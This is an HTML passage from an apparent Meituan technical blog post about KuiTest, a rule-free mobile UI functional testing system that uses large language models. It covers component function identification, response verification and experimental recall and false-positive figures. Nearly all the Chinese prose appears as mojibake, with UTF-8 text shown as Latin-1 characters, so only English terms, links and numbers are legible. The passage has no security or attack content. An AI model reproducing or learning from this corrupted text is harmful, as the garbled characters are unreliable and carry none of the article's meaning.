<p>è€ƒè™‘åˆ° UI åŠŸèƒ½ç¼ºé™·è™½è¡¨ç°å„å¼‚ï¼Œä½†å…±æ€§æ˜¯ App çš„å“åº”åç¦»ç”¨æˆ·é¢„æœŸã€‚å› æ­¤ï¼Œè‹¥èƒ½å®ç°å¯¹ç”¨æˆ·é¢„æœŸçš„æ¨¡æ‹Ÿï¼Œå°±èƒ½ä»¥æ­¤ä½œä¸ºæµ‹è¯•å‡†åˆ™ï¼ˆOracleï¼‰ã€è‡ªåŠ¨åŒ–çš„æ£€æµ‹ UI åŠŸèƒ½æ€§å¼‚å¸¸ã€‚å³æ— éœ€äººå·¥é€é¡µé¢ç¼–å†™è§„åˆ™ï¼Œä»è€Œå¤§å¹…æå‡è‡ªåŠ¨åŒ–çš„ç¨‹åº¦ä¸æµ‹è¯•è¦†ç›–ç‡ã€‚ç”±äºå¤§è¯­è¨€æ¨¡å‹ï¼ˆLLMï¼‰ç»è¿‡æµ·é‡é€šç”¨çŸ¥è¯†è®­ç»ƒï¼Œå…·å¤‡ä¸€å®šçš„æ¨¡æ‹Ÿäººç±»å¸¸è¯†ä¸é¢„æœŸçš„èƒ½åŠ›ï¼Œæ°å¥½å¥‘åˆæ¨¡æ‹Ÿç”¨æˆ·é¢„æœŸçš„éœ€æ±‚ï¼Œä¸”æ— éœ€é’ˆå¯¹ç‰¹å®šåº”ç”¨ / åŠŸèƒ½å•ç‹¬é€‚é…ï¼Œå¤©ç„¶å…·å¤‡æ³›åŒ–æ€§ã€‚å› æ­¤ï¼Œé€šè¿‡åˆ†æ UI åŠŸèƒ½ç¼ºé™·çš„å…±æ€§ï¼Œæˆ‘ä»¬æå‡ºäº†ä¸€ä¸ªå…¨æ–°çš„æ€è·¯ï¼š<strong>èƒ½å¦åŸºäºå¤§æ¨¡å‹ç†è§£â€œäººç±»å¯¹ UI äº¤äº’çš„å¸¸è¯†é¢„æœŸâ€ï¼Œå¹¶ä»¥æ­¤è‡ªåŠ¨åˆ¤æ–­äº¤äº’æ˜¯å¦æ­£ç¡®ï¼Ÿ</strong></p>
<p>åŸºäºè¿™ä¸€ç†å¿µï¼Œæˆ‘ä»¬ä¸å¤æ—¦å¤§å­¦è®¡ç®—ä¸æ™ºèƒ½åˆ›æ–°å­¦é™¢ <a href="https://link.juejin.cn?target=http%3A%2F%2Fy-droid.com%2Fyz%2F" target="_blank" title="http://y-droid.com/yz/" ref="nofollow noopener noreferrer">å‘¨æ‰¬å¸†æ•™æˆå›¢é˜Ÿ</a> å±•å¼€è”åˆç ”ç©¶ï¼Œè®¾è®¡å¹¶å®ç°äº† <strong>KuiTest</strong> â€”â€” ä¸€å¥—åŸºäº <strong>å¤§ä¼—é€šè¯†</strong> çš„ <strong>æ— è§„åˆ™ï¼ˆRule-freeï¼‰UI åŠŸèƒ½æµ‹è¯•ç³»ç»Ÿ</strong>ã€‚KuiTest èƒ½å¤Ÿåƒäººä¸€æ ·ï¼Œç†è§£æŒ‰é’®ã€å›¾æ ‡ç­‰äº¤äº’ç»„ä»¶çš„å«ä¹‰ï¼Œé¢„æµ‹ç‚¹å‡»åçš„åˆç†ç»“æœï¼Œå¹¶æ®æ­¤è‡ªåŠ¨æ ¡éªŒå®é™…ç•Œé¢åé¦ˆæ˜¯å¦ç¬¦åˆé¢„æœŸï¼Œä»è€Œåœ¨æ— éœ€æ‰‹å·¥è„šæœ¬çš„æƒ…å†µä¸‹å®ŒæˆåŠŸèƒ½æµ‹è¯•ã€‚è¯¥å·¥ä½œå·²åœ¨ç¾å›¢ App çš„å¤šä¸ªä¸šåŠ¡ä¸­è½åœ°åº”ç”¨ï¼Œå¹¶äº§å‡ºè®ºæ–‡ã€Š<a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.computer.org%2Fcsdl%2Fproceedings-article%2Ficse-seip%2F2025%2F368500a034" target="_blank" title="https://www.computer.org/csdl/proceedings-article/icse-seip/2025/368500a034" ref="nofollow noopener noreferrer">KuiTest: Leveraging Knowledge in the Wild as GUI Testing Oracle for Mobile Apps</a>ã€‹ï¼Œå·²è¢«å›½é™…é¡¶çº§è½¯ä»¶å·¥ç¨‹ä¼šè®® ICSE 2025ï¼ˆCCF-A ç±»ä¼šè®®ï¼‰çš„ Software In Practice Trackï¼ˆè½¯ä»¶å·¥ç¨‹åº”ç”¨å®è·µï¼‰æ”¶å½•ã€‚</p>
<h2 data-id="heading-1">2. è®¾è®¡æ€è·¯ä¸å®ç°è¿‡ç¨‹</h2>
<h3 data-id="heading-2">2.1 æ€»ä½“æµç¨‹</h3>
<p>KuiTest çš„æ ¸å¿ƒæ˜¯æ£€æŸ¥ UI äº¤äº’åçš„å“åº”æ˜¯å¦ç¬¦åˆä¸€èˆ¬ç”¨æˆ·çš„ <strong>å¸¸è¯†æ€§é¢„æœŸ</strong>ï¼Œå…¶ä¸­ï¼šè¯†åˆ«äº¤äº’ç»„ä»¶çš„åŠŸèƒ½å’Œå¸¸è¯†æ€§é¢„æœŸç”Ÿæˆæ˜¯éœ€è¦ä¸¤é¡¹å…³é”®èƒ½åŠ›ã€‚è€ƒè™‘åˆ°é€šç”¨å¤§æ¨¡å‹å…·å¤‡å›¾æ–‡ç†è§£èƒ½åŠ›ä¸”ä»æµ·é‡çš„è®­ç»ƒæ•°æ®ä¸­ä¹ å¾—äº†å¸¸è¯†æ€§æ¨ç†èƒ½åŠ›ï¼Œå› æ­¤å¤©ç„¶åœ°é€‚åˆæ¨¡æ‹Ÿå¤§ä¼—çš„è®¤çŸ¥å’Œäº¤äº’é¢„æœŸã€‚è‡³æ­¤ï¼ŒKuiTest çš„æ ¸å¿ƒæŒ‘æˆ˜æ˜¯æå‡å¤§æ¨¡å‹åœ¨æ‰§è¡Œ UI åŠŸèƒ½æµ‹è¯•çš„ <strong>æ€§èƒ½å’Œå¯é æ€§</strong>ã€‚è€ƒè™‘åˆ°é€šç”¨å¤§æ¨¡å‹é€šå¸¸å¹¶æœªæ¥å—è¿‡ UI æµ‹è¯•é¢†åŸŸæ•°æ®çš„è®­ç»ƒï¼Œå› æ­¤ç¼ºå°‘ UI è®¤çŸ¥ä¸æµ‹è¯•çš„ç»éªŒï¼Œç›´æ¥è®©å®ƒè¯†åˆ« UI åŠŸèƒ½å’Œç¼ºé™·æ˜¯ååˆ†å›°éš¾çš„ã€‚æ‰€ä»¥æˆ‘ä»¬å€Ÿé‰´äººå·¥æµ‹è¯•çš„æ“ä½œæµç¨‹ï¼Œå°†æµ‹è¯•æµç¨‹æ‹†åˆ†ä»¥é™ä½ LLM çš„ä»»åŠ¡éš¾åº¦ï¼š</p>
<ul>
<li><strong>å¯äº¤äº’ç»„ä»¶åŠŸèƒ½è¯†åˆ«</strong>ï¼šç†è§£æ¯ä¸ªå¯äº¤äº’ç»„ä»¶ï¼ˆå¦‚æŒ‰é’®ã€å›¾æ ‡ï¼‰çš„åŠŸèƒ½å«ä¹‰ã€é¢„æµ‹äº¤äº’åçš„å“åº”ã€‚</li>
<li><strong>äº¤äº’å“åº”éªŒè¯</strong>ï¼šåœ¨æ‰§è¡Œäº¤äº’åï¼ŒéªŒè¯ç•Œé¢å“åº”æ˜¯å¦ç¬¦åˆé¢„æœŸã€‚</li>
</ul>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8b8f3326aec7416f8e2d950d131fd383~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg576O5Zui5oqA5pyv5Zui6Zif:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768875960&amp;x-signature=Cg2SRr7wm%2BqbPkSlio4MgoF6H6o%3D" alt="å›¾ 2 - KuiTest å·¥ä½œåŸç†" loading="lazy"/></p>
<p>å…·ä½“æ¥è¯´ï¼Œå¦‚ä¸Šå›¾ 2 æ‰€ç¤ºï¼Œåœ¨æµ‹è¯•å¼€å§‹æ—¶ï¼Œé¦–å…ˆé€‰æ‹©éœ€è¦äº¤äº’çš„ç»„ä»¶ï¼ŒKuiTest ä¼šåŸºäº GUI æˆªå›¾åˆ†æå’Œç»„ä»¶åº“åŒ¹é…è·å–è¯¥ç»„ä»¶çš„åŠŸèƒ½ï¼Œå¹¶é¢„æµ‹ä¸ä¹‹äº¤äº’åçš„ UI å“åº”ï¼›éšåæ‰§è¡Œäº¤äº’ï¼Œæ ¹æ®ç»„ä»¶çš„é¢„æœŸåŠŸèƒ½ä»¥åŠäº¤äº’åçš„é¡µé¢ä¿¡æ¯åˆ¤æ–­å®é™…å“åº”æ˜¯å¦ç¬¦åˆé¢„æœŸã€‚</p>
<h3 data-id="heading-3">2.2 UI ç»„ä»¶åŠŸèƒ½è¯†åˆ«</h3>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/617d2b8fa3954e82ac3e7b02530b2efd~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg576O5Zui5oqA5pyv5Zui6Zif:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768875960&amp;x-signature=bumBPkkQGZ1osAveqSJDQC6i6pE%3D" alt="å›¾ 3 - å¯äº¤äº’ç»„ä»¶åŠŸèƒ½è¯†åˆ«ä¸ UI å“åº”é¢„æµ‹" loading="lazy"/></p>
<p>ä¸ºäº†æå‡å¤§æ¨¡å‹é¢„æµ‹ UI ç»„ä»¶åŠŸèƒ½çš„å¯é æ€§ï¼ŒKuiTest æ•´åˆäº†å¤šç§ UI é¡µé¢ç›¸å…³ä¿¡æ¯è¾“å…¥ï¼šé¦–å…ˆï¼Œæˆ‘ä»¬è·å–ç»“æ„åŒ–ç»„ä»¶æ ‘å¹¶ç»“åˆ Vision-UI æ¨¡å‹<sup>[1]</sup>ä»æˆªå›¾ä¸­è¯†åˆ«æ‰€æœ‰å¯äº¤äº’ç»„ä»¶ï¼Œå†ç”¨ SoMï¼ˆSet-of-Markï¼‰ç­–ç•¥<sup>[2]</sup>ä¸ºæ¯ä¸ªç»„ä»¶æ·»åŠ  bounding box æ ‡è®°å¹¶åˆ†é…å”¯ä¸€ IDï¼Œå½¢æˆå¸¦æ ‡è®°çš„ UI æˆªå›¾ï¼Œè®©å¤§æ¨¡å‹èƒ½å¿«é€Ÿåˆ†è¾¨å›¾ä¸­å­˜åœ¨çš„ UI ç»„ä»¶ã€‚æ¥ç€ï¼Œé’ˆå¯¹æœ‰æ–‡æœ¬çš„ç»„ä»¶ï¼Œé€šè¿‡ OCR æå–æ–‡å­—å†…å®¹å¹¶æŒ‰â€œç»„ä»¶ ID - æ–‡æœ¬â€ç»“æ„åŒ–æ•´ç†ï¼›é’ˆå¯¹æ— æ–‡æœ¬çš„å›¾æ ‡ç±»ç»„ä»¶ï¼Œåˆ™åˆ©ç”¨ CLIPï¼ˆContrastive Languageâ€“Image Pre-trainingï¼‰æ¨¡å‹<sup>[3]</sup>ä»ç§¯ç´¯çš„å›¾æ ‡åº“ï¼ˆå«å†å²è¯†åˆ«å¤±è´¥å›¾æ ‡åŠäººå·¥æ ‡æ³¨çš„åŠŸèƒ½æè¿°ï¼‰ä¸­æ£€ç´¢ç›¸ä¼¼å›¾æ ‡ï¼Œå¦‚æœå­˜åœ¨ç›¸ä¼¼å›¾æ ‡ï¼Œåˆ™å°†åº“ä¸­å›¾æ ‡çš„åŠŸèƒ½ä¿¡æ¯è¡¥å……è‡³è¾“å…¥æ¥è¾…åŠ©å¤§æ¨¡å‹ç†è§£ç»„ä»¶ã€‚æœ€åï¼Œå°†ä¸Šè¿°æ‰€æœ‰ä¿¡æ¯æ•´åˆè¿› Promptï¼Œè®©å¤§æ¨¡å‹è¯†åˆ«æŒ‡å®šç»„ä»¶çš„åŠŸèƒ½ï¼Œå¹¶é¢„æµ‹äº¤äº’å UI ç•Œé¢çš„å“åº”ã€‚è¿™ä¸€è¿‡ç¨‹æœ‰æ•ˆç¼“è§£äº†é€šç”¨å¤šæ¨¡æ€å¤§æ¨¡å‹ UI è§†è§‰ä¿¡æ¯ç†è§£è–„å¼±çš„ç“¶é¢ˆï¼Œå¹¶ä¸ºåç»­äº¤äº’éªŒè¯æä¾› Oracleã€‚</p>
<h3 data-id="heading-4">2.3 äº¤äº’å“åº”éªŒè¯</h3>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/893f1ebb82ba44cc92e3946fff4a59eb~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg576O5Zui5oqA5pyv5Zui6Zif:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768875960&amp;x-signature=sZbkdS1rh8bXB9%2FQnSPECE%2FQLxE%3D" alt="å›¾ 4 - äº¤äº’å“åº”ç»“æœéªŒè¯è¿‡ç¨‹ä¸ Prompt" loading="lazy"/></p>
<p>äº¤äº’åå“åº”éªŒè¯æ˜¯ KuiTest åˆ¤æ–­ UI åŠŸèƒ½æ˜¯å¦å­˜åœ¨ Bug çš„æ ¸å¿ƒç¯èŠ‚ï¼Œæµç¨‹åˆ†ä¸ºçŠ¶æ€æ¯”å¯¹å’Œ LLM å†³ç­–ä¸¤æ­¥ï¼šKuiTest åœ¨æ¨¡æ‹Ÿç”¨æˆ·äº¤äº’åï¼Œå…ˆé€šè¿‡åƒç´ å¯¹æ¯”åˆ¤æ–­äº¤äº’å‰å UI æ˜¯å¦æœ‰è§†è§‰å˜åŒ–ï¼Œè‹¥æ— å˜åŒ–åˆ™ç›´æ¥æ ‡è®°ä¸º â€œUI äº¤äº’æ— å“åº”â€ï¼›è‹¥æœ‰å˜åŒ–ï¼Œåˆ™è®©å¤šæ¨¡æ€æ¨¡å‹åˆ¤æ–­å®é™… UI å“åº”æ˜¯å¦ç¬¦åˆå‰è¿°é¢„æµ‹ã€‚è‡³æ­¤ï¼ŒKuiTest å®Œæˆäº†ä» UI åŠŸèƒ½è¯­ä¹‰æµ‹è¯•åˆ°é€šç”¨æ¨ç†èƒ½åŠ›ä»»åŠ¡çš„è½¬æ¢ï¼Œæ—¢è§„é¿äº†ä¼ ç»ŸåŸºäºè§„åˆ™æµ‹è¯•ç¹æ‚çš„å¼€å‘å’Œç»´æŠ¤æˆæœ¬ï¼Œä¹Ÿæå‡äº†å¤§æ¨¡å‹åœ¨ UI æµ‹è¯•é¢†åŸŸçš„å†³ç­–çš„å¯é æ€§ï¼Œé™ä½è¯¯æŠ¥ç‡ã€‚</p>
<h2 data-id="heading-5">3. å®éªŒæµ‹è¯•</h2>
<p>KuiTest çš„å®éªŒè®¾è®¡ä»¥éªŒè¯å…¶å¯¹è§£å†³å·¥ä¸šçº§ UI åŠŸèƒ½çš„æµ‹è¯•èƒ½åŠ›ä¸ºæ ¸å¿ƒï¼Œåœ¨ç¾å›¢å®é™…åœºæ™¯ä¸­ç­›é€‰çœŸå®æ•°æ®æ„é€ æ•°æ®é›†ï¼Œå¹¶ä¸”è®¾è®¡é’ˆå¯¹æ€§åŸºçº¿å¯¹æ¯”æ–¹æ¡ˆã€‚åœ¨éªŒè¯æŠ€æœ¯æœ‰æ•ˆæ€§çš„åŒæ—¶ä¸ºä¸šåŠ¡è½åœ°æä¾›æ•°æ®æ”¯æ’‘ï¼Œä¸‹æ–‡å°†ç»§ç»­ä»‹ç»å®éªŒè®¾è®¡ã€è®¾ç½®ä»¥åŠç»“æœåˆ†æã€‚</p>
<h3 data-id="heading-6">3.1 å®éªŒè®¾è®¡</h3>
<p>å®éªŒå›´ç»•ä¸‰ä¸ªå…³é”®é—®é¢˜ï¼ˆRQï¼‰è¿›è¡Œï¼Œç›®æ ‡æ˜¯éªŒè¯ KuiTest è®¾è®¡çš„æœ‰æ•ˆæ€§ä¸åˆç†æ€§ï¼Œä»¥åŠæ˜¯å¦æ»¡è¶³å·¥ä¸šè½åœ°è¦æ±‚ã€‚é’ˆå¯¹ LLM åœ¨ UI ç†è§£é¢†åŸŸèƒ½åŠ›ä¸è¶³çš„é—®é¢˜ï¼Œè®¾ç½® RQ1 ä»è¯¯æŠ¥ç‡å’Œæˆæœ¬çš„è§’åº¦éªŒè¯ä»»åŠ¡åˆ†è§£ï¼ˆæ‹†åˆ†ä¸º â€œç»„ä»¶åŠŸèƒ½è¯†åˆ« + äº¤äº’åå“åº”éªŒè¯â€ï¼‰çš„ç»¼åˆæ€§èƒ½ã€‚æ­¤å¤–ï¼Œè®¾ç½® RQ2 è¯„ä¼°å¤šæ¨¡æ€è¾“å…¥ + å›¾æ ‡åº“çš„æ–¹æ¡ˆæ˜¯å¦èƒ½æé«˜ LLM çš„ç»„ä»¶è¯†åˆ«èƒ½åŠ›ã€‚æœ€åï¼Œé’ˆå¯¹å·¥ä¸šåœºæ™¯å¯¹ â€œé«˜å¬å›ã€ä½è¯¯æŠ¥â€ çš„åˆšéœ€ï¼Œè®¾ç½® RQ3 éªŒè¯ KuiTest åœ¨ç¾å›¢ App ä¸­çš„è½åœ°èƒ½åŠ›ï¼Œé‡ç‚¹è¯„ä¼°å†³å®šç¼ºé™·è¦†ç›–åº¦çš„å¬å›ç‡ä»¥åŠç›´æ¥å½±å“äººå·¥æ’æŸ¥æˆæœ¬çš„è¯¯æŠ¥ç‡ã€‚</p>
<h3 data-id="heading-7">3.2 å®éªŒæ•°æ®ä¸å¯¹ç…§æ–¹æ³•</h3>
<p>å®éªŒä½¿ç”¨çš„åŸºå‡†æ•°æ®é›†è‡ªç¾å›¢çš„æ ¸å¿ƒä¸šåŠ¡çº¿ï¼ˆå¤–å–ã€é…’åº—ã€æ—…è¡Œç­‰ï¼‰ï¼Œè¿™äº›ä¸šåŠ¡çº¿çš„ UI é£æ ¼ã€äº¤äº’è§„åˆ™å‡æœ‰å·®å¼‚ï¼Œå› æ­¤å…·å¤‡å¯¹çœŸå®çš„å·¥ä¸šæµ‹è¯•åœºæ™¯çš„ä»£è¡¨æ€§ã€‚å…·ä½“è€Œè¨€ï¼ŒRQ1 æ•°æ®é›†å« 150 ä¸ª UI äº¤äº’æ“ä½œï¼ˆ25 ä¸ªå†å² Bug+125 ä¸ªæ­£å¸¸ç”¨ä¾‹ï¼‰ï¼Œbug æ¯”ä¾‹ 16.7%ï¼Œå¯¹åº”æ–°åŠŸèƒ½æµ‹è¯•åœºæ™¯ï¼›RQ2 æ•°æ®é›†æ¶µç›– 250 ä¸ªå¯äº¤äº’ UI ç»„ä»¶ï¼ˆå«æ–‡æœ¬ä¸æ— æ–‡æœ¬ç±»å‹ï¼‰ï¼Œç¡®ä¿ç»„ä»¶å¤šæ ·æ€§ï¼›RQ3 æ•°æ®é›†å« 100 ä¸ªçœŸå® UI é¡µé¢ï¼ˆ4664 ä¸ªç»„ä»¶ã€150 ä¸ªæ³¨å…¥ Bugï¼‰ï¼ŒBug å æ¯”ä»… 3.2%ï¼Œä¸å·¥ä¸šåœºæ™¯ Bug ç¨€ç–çš„å®é™…æƒ…å†µä¸€è‡´ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e57259126daa416abcb245f2f380c067~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg576O5Zui5oqA5pyv5Zui6Zif:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768875960&amp;x-signature=hkDBWPR1HRCMvlVbaIsNAOW0Clw%3D" alt="å›¾ 5 - ä»»åŠ¡åˆ†è§£çš„ç¤ºæ„ä¸åŸºçº¿æ–¹æ³•" loading="lazy"/></p>
<p>æˆ‘ä»¬ä¸ºå„å®éªŒè®¾ç½®äº†åŸºçº¿æ–¹æ³•ä½œä¸ºå¯¹ç…§ï¼šRQ1 è®¾æ— åˆ†è§£ï¼ˆç›´æ¥è®©å¤§æ¨¡å‹åˆ¤æ–­ï¼‰ä¸ä¸‰æ­¥åˆ†è§£ï¼ˆå•ç‹¬æå–äº¤äº’åé¡µé¢è¯­ä¹‰ï¼‰å¯¹ç…§ï¼Œå‰è€…éªŒè¯æ˜¯å¦éœ€è¦åˆ†è§£ï¼Œåè€…éªŒè¯åˆ†è§£æ­¥æ•°åˆç†æ€§ï¼›RQ2 è®¾çº¯ LLMï¼ˆä»…æˆªå›¾ï¼‰ã€å›¾ç‰‡ + æ–‡æœ¬ï¼ˆæ— å›¾æ ‡åº“ï¼‰ã€SoM + æ–‡æœ¬ï¼ˆæ— å›¾æ ‡åº“ï¼‰å¯¹ç…§ï¼Œåˆ†åˆ«éªŒè¯æ–‡æœ¬ä¿¡æ¯ã€ç»„ä»¶æ ‡è®°ä»¥åŠå›¾æ ‡åº“çš„ä»·å€¼ï¼Œæ’é™¤å•ä¸€å˜é‡å¹²æ‰°ï¼›RQ3 è™½æ— å¤–éƒ¨å·¥å…·å¯¹ç…§ï¼Œä½†é€šè¿‡è¦†ç›–ç¾å›¢å†… 10 ç§ä¸šåŠ¡çº¿ï¼Œä»¥éªŒè¯ KuiTest çš„ç°å®æ³›åŒ–æ€§ã€‚</p>
<h3 data-id="heading-8">3.3 å®éªŒç»“æœ</h3>
<p><strong>RQ1ï¼šä»»åŠ¡åˆ†è§£çš„åˆç†æ€§</strong></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/991ac6b758d446f6b37d8bd87d442235~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg576O5Zui5oqA5pyv5Zui6Zif:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768875960&amp;x-signature=cI8W2%2B0nUDajhCJ2YB1hG83Q12I%3D" alt="" loading="lazy"/></p>
<p>ä»»åŠ¡åˆ†è§£å¯¹æ¯”ç»“æœæ˜¾ç¤ºï¼Œæœ‰åˆ†è§£çš„æ–¹æ¡ˆæ¯”æ— åˆ†è§£çš„æ–¹æ¡ˆåœ¨å‡†ç¡®ç‡å’Œå¬å›ç‡ä¸Šéƒ½æœ‰æ˜æ˜¾æé«˜ï¼Œå¹¶ä¸” KuiTest çš„ä¸¤æ­¥åˆ†è§£æ–¹æ¡ˆï¼ˆç»„ä»¶è¯†åˆ« + å“åº”éªŒè¯ï¼‰è¡¨ç°æœ€ä¼˜ï¼šå¹³å‡å‡†ç¡®ç‡ 86%ã€å¬å›ç‡ 85%ã€‚</p>
<p>è¿™ä¸€ç»“æœå°è¯äº†ä»»åŠ¡åˆ†è§£åˆç†æ€§ã€‚å¯¹äºä¸‰æ­¥åˆ†è§£çš„æ–¹æ¡ˆæ•ˆæœä¼šç•¥å·®äºä¸¤æ­¥åˆ†è§£çš„ç»“æœï¼Œæˆ‘ä»¬åˆ†æå‘ç°ä¸‰æ­¥åˆ†è§£é¢å¤–è¯­ä¹‰æå–æ­¥éª¤ï¼Œè™½èƒ½æå‡é¡µé¢ç±»å‹ç†è§£ï¼Œä½†ä¼šè®© LLM å¿½ç•¥å›¾æ ‡é¢œè‰²å˜åŒ–ç­‰ç»†èŠ‚ï¼Œå¯¼è‡´éè·³è½¬ç±» UI åŠŸèƒ½ Bug æ¼æ£€ï¼ˆå¦‚ç‚¹å‡»æ”¶è—æŒ‰é’®åæŒ‰é’®åº”è¯¥ä»ç©ºå¿ƒå˜ä¸ºå®å¿ƒï¼‰ï¼Œä¸”å¢åŠ è®¡ç®—æˆæœ¬ã€‚è¿™è¯´æ˜åˆ†è§£å¹¶éæ­¥éª¤è¶Šå¤šè¶Šå¥½ï¼Œéœ€è´´åˆå¤§æ¨¡å‹èƒ½åŠ›è¾¹ç•Œï¼Œæ‰¾åˆ°å¯é æ€§å’Œæ•ˆç‡å¹³è¡¡ç‚¹ï¼Œè€Œä¸¤æ­¥åˆ†è§£æ°å¥½æˆä¸ºå®ç°è¿™ä¸€ç›®æ ‡çš„æœ€ä¼˜è§£ã€‚</p>
<p><strong>RQ2ï¼šç»„ä»¶åŠŸèƒ½è¯†åˆ«çš„æœ‰æ•ˆæ€§</strong></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6e53ef8fa69e43f3a9a6cd8b4064c8ae~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg576O5Zui5oqA5pyv5Zui6Zif:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768875960&amp;x-signature=cqNjZfZCpLYw1DfFSrHaO6lCRs4%3D" alt="" loading="lazy"/></p>
<p>ç»„ä»¶åŠŸèƒ½è¯†åˆ«ç»“æœæ˜¾ç¤ºï¼ŒKuiTest æ–¹æ¡ˆçš„å¹³å‡è¯†åˆ«å‡†ç¡®ç‡è¾¾ 95.5%ï¼Œå…¶ä¸­æ–‡æœ¬ç»„ä»¶å‡†ç¡®ç‡ 96%ï¼Œæ— æ–‡æœ¬å›¾æ ‡å‡†ç¡®ç‡ 95%ï¼›è€Œå¯¹ç…§æ–¹æ¡ˆä¸­ï¼Œçº¯ LLM çš„æ— æ–‡æœ¬å›¾æ ‡å‡†ç¡®ç‡ä»… 13%ï¼Œå›¾ç‰‡ + æ–‡æœ¬å’Œ SoM + æ–‡æœ¬çš„æ–¹æ¡ˆå‡†ç¡®ç‡ä¹Ÿæœªçªç ´ 20%ã€‚</p>
<p>è¿™ä¸€æ•°æ®è¡¨æ˜å¯¹ UI å›¾åƒè¿›è¡Œæ ‡è®°ä»¥åŠå¯¹ UI ç»„ä»¶è¯­ä¹‰ä¿¡æ¯çš„é¢å¤–è¡¥å……ï¼Œèƒ½å¤Ÿæ˜¾è‘—æé«˜ LLM çš„ UI ç»„ä»¶åŠŸèƒ½è¯†åˆ«èƒ½åŠ›ã€‚LLM è§†è§‰ç†è§£èƒ½åŠ›è–„å¼±ï¼Œçº¯æˆªå›¾è¾“å…¥æ— æ³•è¯†åˆ«æ— æ–‡æœ¬å›¾æ ‡ï¼Œè€Œ OCR æ–‡æœ¬ + ç»„ä»¶æ ‡è®°èƒ½è¡¥å……ç»„ä»¶çš„æ–‡æœ¬è¯­ä¹‰ï¼Œæå‡æ–‡æœ¬ç»„ä»¶è¯†åˆ«å‡†ç¡®ç‡ã€‚å€ŸåŠ©å›¾æ ‡åº“ä¸ºæ— æ–‡æœ¬ç»„ä»¶è¡¥å……åŠŸèƒ½æè¿°ï¼Œç›´æ¥å°†å…¶è¯†åˆ«å‡†ç¡®ç‡ä» 13% æå‡è‡³ 95%ã€‚å¹¶ä¸”è¿™ä¸€å›¾æ ‡åº“å¹¶ä¸æ˜¯å…¨é‡çš„ï¼Œè¯´æ˜ä»…é€šè¿‡ä¸šåŠ¡çº¿å¸¸ç”¨å›¾æ ‡å³å¯è¦†ç›–å¤§éƒ¨åˆ†åœºæ™¯ï¼Œå…¼é¡¾å‡†ç¡®æ€§ä¸æˆæœ¬ã€‚</p>
<p><strong>RQ3ï¼šå¯¹äºçœŸå® UI åŠŸèƒ½å¼‚å¸¸è¯†åˆ«çš„æœ‰æ•ˆæ€§</strong></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/92d84a1449774e02875f78d910554e84~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg576O5Zui5oqA5pyv5Zui6Zif:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768875960&amp;x-signature=cg1ig5BjvFCHlNGTf2ESFtspezg%3D" alt="" loading="lazy"/></p>
<p>åœ¨ç¾å›¢ 10 å¤§ä¸šåŠ¡çº¿çš„çœŸå®åœºæ™¯æµ‹è¯•ä¸­ï¼ŒKuiTest æ•´ä½“å¬å›ç‡ 86%ã€ç²¾ç¡®ç‡ 71%ã€è¯¯æŠ¥ç‡ 1.2%ï¼Œä¸”å„ä¸šåŠ¡çº¿è¡¨ç°ç¨³å®šã€‚è¿™äº›å®éªŒç»“æœè¡¨æ˜ KuiTest å…·å¤‡å®é™…è½åœ°èƒ½åŠ›ã€‚86% çš„å¬å›ç‡æ„å‘³ç€èƒ½è¦†ç›–ç»å¤§å¤šæ•°çœŸå® UI åŠŸèƒ½ bugï¼Œé¿å…æ¼æ£€å…³é”®ç¼ºé™·ã€‚1.2% çš„è¯¯æŠ¥ç‡æœ‰æ•ˆé¿å…å¯¼è‡´æµ‹è¯•å·¥ç¨‹å¸ˆè¿›è¡Œæ— æ•ˆæ’æŸ¥ï¼Œå¤§å¹…é™ä½äººå·¥æˆæœ¬ã€‚71% çš„ç²¾ç¡®ç‡è™½çœ‹ä¼¼ä¸é«˜ï¼Œä½†å› å®éªŒä¸­ Bug å æ¯”ä»… 3.2%ï¼ˆä¸çœŸå®åœºæ™¯ä¸€è‡´ï¼‰ï¼Œåœ¨ Bug ç¨€ç–ç¯å¢ƒä¸‹å·²å±ä¼˜ç§€ã€‚å®éªŒç»“æœè¯æ˜äº† KuiTest åœ¨çœŸå®æµ‹è¯•åœºæ™¯ä¸­èƒ½å¹³è¡¡è¦†ç›–åº¦ä¸å‡†ç¡®æ€§ã€‚</p>
<h2 data-id="heading-9">4. åº”ç”¨æ•ˆæœ</h2>
